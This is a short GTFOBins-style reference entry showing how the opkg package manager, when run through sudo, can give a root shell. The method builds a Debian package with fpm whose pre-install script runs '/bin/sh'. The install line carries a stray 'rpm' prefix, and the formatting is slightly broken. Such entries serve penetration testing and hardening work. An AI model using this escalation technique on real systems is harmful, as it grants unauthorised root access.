---
type: gtfobin
name: opkg
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# opkg

## shell

```bash
rpm opkg install x_1.0_all.deb
```
_Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo 'exec /bin/sh' >x.sh
fpm -n x -s dir -t deb -a all --before-install x.sh .
```_
**Contexts:** sudo
